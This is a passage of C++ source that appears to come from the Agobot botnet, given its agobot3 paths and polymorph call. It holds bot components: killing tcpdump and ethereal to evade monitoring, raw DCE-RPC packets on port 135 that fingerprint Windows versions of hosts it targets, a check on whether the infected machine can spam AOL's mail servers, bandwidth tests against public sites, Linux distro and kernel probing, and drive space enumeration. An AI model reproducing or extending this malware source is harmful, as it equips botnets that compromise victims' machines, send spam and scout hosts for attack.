	for(int i=0; szFilenamesToKill[i]!=NULL; i++) KillProcess(szFilenamesToKill[i]);
#else
	KillProcess("tcpdump"); KillProcess("ethereal");
#endif
}

int GetFileSize(FILE *fp)
{	long lLastPos=ftell(fp); fseek(fp, 0, SEEK_END);
	long lFileSize=ftell(fp); fseek(fp, lLastPos, SEEK_SET);
	return (int)lFileSize; }

/*
	This breaks an URL to pieces, and stores them in pURL
*/

bool ParseURL(const char *szURL, url *pURL)
{	if(!szURL) return false; CString sURL; sURL.Assign(szURL);
	// Get the protocol (ie. http), and check if its a supported protocol
	pURL->sProto.Assign(sURL.Token(0, ":"));
	if(pURL->sProto.Compare("http") && pURL->sProto.Compare("ftp")) return false;
	// Check if there are auth infos
	if(sURL.Token(1, "/").Find('@')) {
		// Get the hostname and check if it isnt empty
		pURL->sHost.Assign(sURL.Token(1, "/").Token(1, "@").Token(0, ":"));
		if(!pURL->sHost.Compare("")) return false;
		// Get the port and check if it isnt null
		pURL->iPort=atoi(sURL.Token(1, "/").Token(1, "@").Token(1, ":").CStr());
		if(!pURL->iPort) {
			if(!pURL->sProto.Compare("http")) pURL->iPort=80;
			if(!pURL->sProto.Compare("ftp")) pURL->iPort=21;
		}
		// Get the username and check if it isnt empty
		pURL->sUser.Assign(sURL.Token(1, "/").Token(0, "@").Token(0, ":"));
		if(!pURL->sUser.Compare("")) return false;
		// Get the password and check if it isnt empty
		pURL->sPassword.Assign(sURL.Token(1, "/").Token(0, "@").Token(1, ":"));
		if(!pURL->sPassword.Compare("")) return false;
	} else {
		// Get the hostname and check if it isnt empty
		pURL->sHost.Assign(sURL.Token(1, "/").Token(0, ":"));
		if(!pURL->sHost.Compare("")) return false;
		// Get the port and check if it isnt null
		pURL->iPort=atoi(sURL.Token(1, "/").Token(1, ":").CStr());
		if(!pURL->iPort) {
			if(!pURL->sProto.Compare("http")) pURL->iPort=80;
			if(!pURL->sProto.Compare("ftp")) pURL->iPort=21;
		}
	}
	// Get the request for the server
	CString sReq=sURL.Mid(sURL.Find("/")); sReq=sReq.Mid(sReq.Find("/")); sReq=sReq.Mid(sReq.Find("/"));
	pURL->sReq.Assign("/"); pURL->sReq.Append(sReq);
	return true; }

/*
	This checks if pSearch is contained in pMem
*/

bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;
	return false; }

char rpcfp_bindstr[]=
	"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
	"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
	"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
	"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
	"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
	"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
	"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";


int FpHost(const char *szHost, int iFpType)
{	switch(iFpType) {
	case FP_RPC:
	{	int iRetVal=OS_UNKNOWN;
		CSocket sSocket; char szRecvBuf[8192];
		if(sSocket.Connect(szHost, 135))
		{	if(!sSocket.Write(rpcfp_bindstr, sizeof(rpcfp_bindstr)-1))
			{	sSocket.Disconnect(); return iRetVal; }
			if(!sSocket.Recv(szRecvBuf, sizeof(szRecvBuf)))
			{	sSocket.Disconnect(); return iRetVal; }
			if(szRecvBuf[2]==DCE_PKT_BINDACK)
			{	if(!sSocket.Write(rpcfp_inqifids, sizeof(rpcfp_inqifids)-1))
				{	sSocket.Disconnect(); return iRetVal; }
				int iRead=0;
				if(!sSocket.Recv(szRecvBuf, sizeof(szRecvBuf), &iRead))
				{	sSocket.Disconnect(); return iRetVal; }
				if(szRecvBuf[2]==DCE_PKT_RESPONSE)
				{	if(MemContains(szRecvBuf, iRead, w2kuuid_sig, sizeof(w2kuuid_sig)-1))
					{	if(iRead<300) iRetVal=OS_WINNT; else iRetVal=OS_WIN2K; }
					else if(MemContains(szRecvBuf, iRead, wxpuuid_sig, sizeof(wxpuuid_sig)-1))
						iRetVal=OS_WINXP;
					else
						iRetVal=OS_UNKNOWN; }
				else
				{	sSocket.Disconnect(); return iRetVal; } }
			else
			{	sSocket.Disconnect(); return iRetVal; } }
		else
		{	sSocket.Disconnect(); return iRetVal; }
		sSocket.Disconnect(); return iRetVal; }
		break;
	case FP_PORT5K:
		if(ScanPort(szHost, 5000)) return OS_WINXP;
		break;
	case FP_TTL:
		return OS_UNKNOWN;
		break;
	default:
		return OS_UNKNOWN;
		break; }
	return OS_UNKNOWN; }

/*
	Blocked message:
554- (RTR:DU)  The IP address you are using to connect to AOL is a dynamic
554- (residential) IP address.  AOL will not accept future e-mail transactions
554- from this IP address until your ISP removes this IP address from its list
554- of dynamic (residential) IP addresses.  For additional information,
554  please visit http://postmaster.info.aol.com.

	Accept message:
	220-rly-xi02.mx.aol.com ESMTP mail_relay_in-xi2.1; Wed, 24 Sep 2003 18:39:38 -04
*/

bool CanSpamAOL() {
	int iIsMsg_Matched=0;	// How much the AOL blocking message has been matched in %
							// 25% are for occurence of string "postmaster.info.aol.com"
							// 20% are for an immediate 554
							// 10% are for a line count of 5
							// 10% are for occurence of string "(RTR:DU)"
							// 10% are for occurence of string "not accept"
							// 5% are for occurence of string "dynamic" (occurs 2 times)
							// 5% are for occurence of string "residential" (occurs 2 times)
							// 5% are for occurence of string "are using to"

	CDNS cDNS; CString sDNS=cDNS.ResolveMX("aol.com");
	const char *szDNS=sDNS.CStr();
	if(!strcmp(szDNS, "")) return false;

	CSocket sAOLSock; if(!sAOLSock.Connect(szDNS, 25)) return false;
	int iCount=0; char szBuf[4096]; while(sAOLSock.RecvLine(szBuf, sizeof(szBuf))) {
		if(strstr(szBuf, "220-") && strstr(szBuf, "ESMTP")) break;
		if(strstr(szBuf, "postmaster.info.aol.com")) iIsMsg_Matched+=25;
		if(strstr(szBuf, "554-") && iCount==1) iIsMsg_Matched+=20;
		if(strstr(szBuf, "(RTR:DU)")) iIsMsg_Matched+=10;
		if(strstr(szBuf, "not accept")) iIsMsg_Matched+=10;
		if(strstr(szBuf, "dynamic")) iIsMsg_Matched+=5;
		if(strstr(szBuf, "residential")) iIsMsg_Matched+=5;
		if(strstr(szBuf, "are using to")) iIsMsg_Matched+=5;
		iCount++; }
	if(iCount==5) iIsMsg_Matched+=10;

	sAOLSock.Write("QUIT\n", sizeof("QUIT\n"));

	bool bRetVal=false;

	if(iIsMsg_Matched <= 5) bRetVal=true;

	sAOLSock.Disconnect();

	return bRetVal; }

bool GetKVersion(char **pszBuf, int iDistro)
{
	switch(iDistro)
	{
	case LINUX_TYPE_SUSE:
		system("uname -r -s -m > ktemp");
		break;
	case LINUX_TYPE_DEBIAN:
		system("uname -r -o -m > ktemp");
		break;
	default:
		system("uname -r -m > ktemp");
		break;
	}
	
	FILE *fp=fopen("ktemp", "r"); if(!fp) return false;
	fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
	if(lFileSize==0) { fclose(fp); return false; }
	char szKVer[64];
	if(fread(szKVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
	for(int i=0;i<lFileSize;i++) if(szKVer[i]=='\n' || szKVer[i]=='\r') szKVer[i]='\0';
	
	*pszBuf=(char*)malloc(lFileSize); if(!*pszBuf) { fclose(fp); return false; }
		
	sprintf(*pszBuf, "%s", szKVer);

	fclose(fp);
	
	system("rm -f ktemp");
	
	return true;
}

bool GetVersion(char **pszBuf, int iDistro)
{
	switch(iDistro)
	{
	case LINUX_TYPE_SUSE:
		{	FILE *fp=fopen("/etc/SuSE-release", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szSuSEVer[64];
			if(fread(szSuSEVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szSuSEVer[i]=='\n' || szSuSEVer[i]=='\r') szSuSEVer[i]='\0';
			
			char *szVersionNum;
			strtok(szSuSEVer, " "); strtok(NULL, " "); szVersionNum=strtok(NULL, " ");

			*pszBuf=(char*)malloc(256); if(!*pszBuf) { fclose(fp); return false; }
			
			sprintf(*pszBuf, "SuSE %s", szVersionNum);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_REDHAT:
		{	FILE *fp=fopen("/etc/redhat-release", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szRedHatVer[64];
			if(fread(szRedHatVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szRedHatVer[i]=='\n' || szRedHatVer[i]=='\r') szRedHatVer[i]='\0';
			
			char *szVersionNum; char *szReleaseName;
			if(szRedHatVer[0]=='r') // RedHat versions <= 5.0
			{	strtok(szRedHatVer, " "); szVersionNum=strtok(NULL, " ");
				char *szTemp=strtok(NULL, " "); szTemp=strtok(szTemp, "(");
				szReleaseName=strtok(szTemp, ")");
			}
			else if(szRedHatVer[0]=='R') // RedHat versions >= 5.2
			{	strtok(szRedHatVer, " "); strtok(NULL, " "); strtok(NULL, " "); strtok(NULL, " "); szVersionNum=strtok(NULL, " ");
				char *szTemp=strtok(NULL, " "); szTemp=strtok(szTemp, "(");
				szReleaseName=strtok(szTemp, ")");
			}
			else { fclose(fp); return false; }

			*pszBuf=(char*)malloc(256); if(!*pszBuf) { fclose(fp); return false; }
			
			sprintf(*pszBuf, "Red Hat %s (%s)", szVersionNum, szReleaseName);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_DEBIAN:
		{	FILE *fp=fopen("/etc/debian_version", "r");
			if(!fp) return false;
			fseek(fp, 0, SEEK_END); long lFileSize=ftell(fp); fseek(fp, 0, SEEK_SET);
			if(lFileSize==0) { fclose(fp); return false; }
			char szDebVer[16];
			if(fread(szDebVer, sizeof(char), lFileSize, fp)<1) { fclose(fp); return false; }
			for(int i=0;i<lFileSize;i++) if(szDebVer[i]=='\n' || szDebVer[i]=='\r') szDebVer[i]='\0';

			*pszBuf=(char*)malloc(strlen(szDebVer)+strlen("Debian ")+1); if(!*pszBuf) { fclose(fp); return false; }
			sprintf(*pszBuf, "Debian %s", szDebVer);

			fclose(fp); return true;
		}
		break;
	case LINUX_TYPE_SLACKWARE:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Slackware");
		}
		break;
	case LINUX_TYPE_MANDRAKE:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Mandrake");
		}
		break;
	case LINUX_TYPE_YELLOWDOG:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "Yellowdog");
		}
		break;
	case LINUX_TYPE_TURBOLINUX:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "TurboLinux");
		}
		break;
	case LINUX_TYPE_UNITEDLINUX:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "UnitedLinux");
		}
		break;
	case LINUX_TYPE_FREEBSD:
		{
			*pszBuf=(char*)malloc(256); if(!*pszBuf) return false;
			sprintf(*pszBuf, "FreeBSD");
		}
		break;
	default:
		return false;
		break;
	}
	return false;
}

int GetDistro()
{
	FILE *fp;
	
	fp=fopen("/etc/SuSE-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_SUSE; }
	
	fp=fopen("/etc/redhat-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_REDHAT; }

	fp=fopen("/etc/debian_version", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_DEBIAN; }

	fp=fopen("/etc/mandrake-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_MANDRAKE; }

	fp=fopen("/etc/yellowdog-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_YELLOWDOG; }

	fp=fopen("/etc/turbolinux-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_TURBOLINUX; }

	fp=fopen("/etc/slackware-version", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_SLACKWARE; }

	fp=fopen("/etc/UnitedLinux-release", "r");
	if(fp) { fclose(fp); return LINUX_TYPE_UNITEDLINUX; }
	
	fclose(fp); return LINUX_TYPE_UNKNOWN;
}

#define NUM_KILOBYTES 250

// Return speed to host:80 in kbit per second

unsigned long GetSpeed(const char *szHost) {
	if(strlen(szHost)>255) return 0;
	unsigned long lBufSize=NUM_KILOBYTES*1024; CSocket sMSWeb;
	if(!sMSWeb.Connect(szHost, 80)) return 0;

	char *szBuf=new char[lBufSize+3];

	int iChar=(char)brandom(1,255);
	memset(szBuf,	0,		lBufSize+1	);
	memset(szBuf,	iChar,	lBufSize	);

	unsigned long lStrLen=strlen(szBuf);

	char *szPostReq=new char[lBufSize+1002];
	sprintf(szPostReq, "POST / HTTP/1.0\r\n"
		"Host: %s\r\n"
		"Content-Length: %d\r\n"
		"\r\n",
		szHost, lStrLen);
	strcat(szPostReq, szBuf);
	strcat(szPostReq, "\r\n");
	
	lStrLen=strlen(szPostReq);

	unsigned long lStartMS=GetTickCount();

	for(unsigned long l=0; l<lStrLen; l+=1024) {
		if(lStrLen-l < 1024) {
			if(!sMSWeb.Write(szPostReq+l, lStrLen-l))
			{	sMSWeb.Disconnect();
				delete [] szBuf; delete[] szPostReq;
				return 0; }
		} else {
			if(!sMSWeb.Write(szPostReq+l, 1024))
			{	sMSWeb.Disconnect();
				delete [] szBuf; delete[] szPostReq;
				return 0; }
		}
	}

	unsigned long lEndMS=GetTickCount();

	float fElapsedS=(float)(lEndMS-lStartMS)/1000.0f;
	if(fElapsedS==0.0f) fElapsedS=1.0f;

	float fBytesPS=(float)lStrLen/fElapsedS;	// Get bytes per second
	float fKBytesPS=fBytesPS/1024.0f;			// Get kilobytes per second
	float fBitsPS=fBytesPS*8.0f;				// Get bits per second
	float fKBitsPS=fBitsPS/1024.0f;				// Get kilobits per second

	sMSWeb.Disconnect();
	delete [] szBuf; delete[] szPostReq;

	return fKBitsPS; }

void DoSpeedTest(speedtest_data *pData)
{
	unsigned long lProbe1, lProbe2;

	// EU
	lProbe1=GetSpeed("www.schlund.net");
	lProbe2=GetSpeed("www.utwente.nl");
	pData->lEUSpeed=(lProbe1+lProbe2)/2;

	// US
	lProbe1=GetSpeed("www.xo.net");
	lProbe2=GetSpeed("www.stanford.edu");
	pData->lUSSpeed=(lProbe1+lProbe2)/2;

	// ASIA
	lProbe1=GetSpeed("www.lib.nthu.edu.tw");
	lProbe2=GetSpeed("www.st.lib.keio.ac.jp");
	pData->lASIASpeed=(lProbe1+lProbe2)/2;

	pData->lTotalSpeed=(pData->lEUSpeed+pData->lUSSpeed+pData->lASIASpeed)/3;
}

CStartupThread::CStartupThread()
{	m_szType="CStartupThread";
	m_speedData.lEUSpeed=0; m_speedData.lUSSpeed=0;
	m_speedData.lASIASpeed=0; m_speedData.lTotalSpeed=0;
	m_bCanSpamAOL=false; m_bCanSpamAOLSet=false; m_bDataSet=false; }

CStartupThread::~CStartupThread() { m_bDataSet=false; m_bCanSpamAOLSet=false; }

void *CStartupThread::Run()
{	if(g_pMainCtrl->m_cBot.spam_aol_enabled.bValue) m_bCanSpamAOL=CanSpamAOL();
	m_bCanSpamAOLSet=true;
	DoSpeedTest(&m_speedData);
	m_bDataSet=true;

	return NULL;
}

// My test function, so i don't have to recompile everything for testing code


void test()
{
//	g_pMainCtrl->m_cPolymorph.DoPolymorph("D:\\MyProjects\\agobot3_current\\bin\\win32\\agobot3.exe",
//		"D:\\MyProjects\\agobot3_current\\bin\\win32\\agobot3.poly.exe");
//	exit(1);
}

list<CString> lChans;
int isSilent(CString chanName)
{
	list<CString>::iterator is;
	for(is=lChans.begin(); is!=lChans.end(); is++)
	{
		if (!(*is).Compare(chanName)) return 1;
	}
	return 0;
}

void setSilent(CString chanName, int value)
{
	list<CString>::iterator is;
	switch (value)
	{
		case 0:
		{
			for(is=lChans.begin(); is!=lChans.end(); is++)
			{
				if (!(*is).Compare(chanName))
				{
					lChans.erase(is);
				}
			}
			break;
		}

		case 1:
		{
			lChans.push_back(chanName);
			break;
		}
	}
}

typedef BOOL (CALLBACK* LPFNGETSPACEEX)(LPCTSTR,
										PULARGE_INTEGER,
										PULARGE_INTEGER,
										PULARGE_INTEGER);

typedef BOOL (CALLBACK* LPFNGETSPACE)(	LPCTSTR,
										LPDWORD,
										LPDWORD,
										LPDWORD,
										LPDWORD);

CString GetFreeDiskSpace(void)
{
	BOOL bResult = FALSE;
	CString tmpRtn="";
	char *sPath[24] = {"C:","D:","E:","F:","G:","H:","I:","J:","K:","L:", \
					   "M:","N:","O:","P:","Q:","R:","S:","T:","U:","V:", \
					   "W:","X:","Y:","Z:"};
	//HMODULE hKernel = GetModuleHandle("Kernel32.dll");
	HINSTANCE hKernel = LoadLibrary("kernel32.dll");
	if(hKernel)
	{

		LPFNGETSPACEEX	pfnGetDiskFreeSpaceEx	= (LPFNGETSPACEEX)::GetProcAddress(hKernel, "GetDiskFreeSpaceExA" );
		LPFNGETSPACE	pfnGetDiskFreeSpace		= (LPFNGETSPACE)::GetProcAddress(hKernel, "GetDiskFreeSpaceA" );
		
		for (int i=0;i<24;i++)
		{
		
		if (pfnGetDiskFreeSpaceEx)
		{
			ULARGE_INTEGER nCallerFreeBytes;	// Receives the number of bytes on
												// disk available to the caller
			ULARGE_INTEGER nDiskSize;			// Receives the number of bytes on disk
			ULARGE_INTEGER nTotalFreeBytes;		// Receives the total free bytes on the disk

			bResult = pfnGetDiskFreeSpaceEx(sPath[i],
											&nCallerFreeBytes,
											&nDiskSize,
											&nTotalFreeBytes);
			if (bResult)
			{
				if ((nCallerFreeBytes.QuadPart / 1024 / 1024) != 0)
				tmpRtn.Format("%s%s%dMB ",tmpRtn.CStr(),sPath[i],(nCallerFreeBytes.QuadPart / 1024 / 1024));
			}
		}

		// Failing that try the old fashioned way...
		if (!bResult)
		{
			DWORD dwSectorsPerCluster;
			DWORD dwBytesPerSector;
			DWORD dwFreeClusters;
			DWORD dwTotalClusters;

			bResult = pfnGetDiskFreeSpace(	sPath[i],
											&dwSectorsPerCluster,
											&dwBytesPerSector,
											&dwFreeClusters,
											&dwTotalClusters);
			if (bResult)
			{
				if ((dwFreeClusters * dwSectorsPerCluster * dwBytesPerSector / 1024 / 1024) != 0)
				tmpRtn.Format("%s %s%dMB ",tmpRtn.CStr(),sPath[i],(dwFreeClusters * dwSectorsPerCluster * dwBytesPerSector / 1024 / 1024));
			}
		}
		}
}
	return tmpRtn;
}
